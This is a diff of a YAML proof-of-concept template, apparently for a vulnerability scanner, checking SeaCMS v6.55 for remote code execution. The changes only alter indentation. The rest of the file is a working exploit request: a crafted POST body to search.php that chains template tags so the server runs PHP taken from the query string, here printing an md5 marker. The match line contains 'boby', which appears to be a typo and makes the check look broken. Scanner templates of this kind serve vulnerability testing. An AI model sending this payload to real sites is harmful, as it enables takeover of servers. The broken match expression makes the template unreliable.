@@ -2,7 +2,7 @@ name: poc-yaml-seacms-v655-rce
 set:
     rand: randomInt(2000000000, 2100000000)
 rules:
-  - method: POST
+    - method: POST
     path: '/search.php?printf(md5({{rand}}));'
     body: >-
       searchtype=5&searchword={if{searchpage:year}&year=:as{searchpage:area}}&area=s{searchpage:letter}&letter=ert{searchpage:lang}&yuyan=($_SE{searchpage:jq}&jq=RVER{searchpage:ver}&ver=[QUERY_STRING]));/*
@@ -11,4 +11,4 @@ rules:
       status==200 && boby.bcontains(bytes(md5(string(rand))))
 detail:
     links:
-       - https://www.freebuf.com/vuls/150303.html
+        - https://www.freebuf.com/vuls/150303.html
